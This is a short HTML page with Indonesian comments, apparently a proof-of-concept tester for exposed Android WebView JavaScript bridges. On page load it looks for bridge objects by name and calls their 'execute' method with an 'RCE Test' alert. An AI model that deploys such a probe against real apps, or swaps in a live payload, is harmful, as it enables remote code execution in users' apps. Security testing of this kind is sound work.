<!DOCTYPE html>
<html>
<head>
    <title>Bridge Security Tester</title>
</head>
<body>
    <h1>Security Diagnostic Tool</h1>
    <p>Status: <span id="status">Mendeteksi Bridge...</span></p>
    <div id="output" style="border: 1px solid #ccc; padding: 10px; margin-top: 10px;"></div>

    <script>
        function log(message) {
            const div = document.getElementById('output');
            div.innerHTML += '<p>' + message + '</p>';
        }

        // Daftar nama bridge yang sering digunakan (contoh umum)
        const bridges = ['AndroidBridge', 'WebViewBridge', 'JSInterface', '1inchBridge'];

        window.onload = function() {
            let found = false;
            bridges.forEach(name => {
                if (window[name]) {
                    log('Ditemukan: ' + name);
                    found = true;
                    
                    // Mencoba memanggil method untuk tes eksekusi
                    try {
                        log('Mencoba eksekusi method...');
                        // Contoh memanggil fungsi 'execute' jika ada
                        window[name].execute('alert("RCE Test")'); 
                    } catch (e) {
                        log('Error saat eksekusi: ' + e.message);
                    }
                }
            });

            if (!found) {
                document.getElementById('status').innerText = 'Tidak ada Bridge yang terekspos.';
            } else {
                document.getElementById('status').innerText = 'Bridge ditemukan!';
            }
        };
    </script>
</body>
</html>
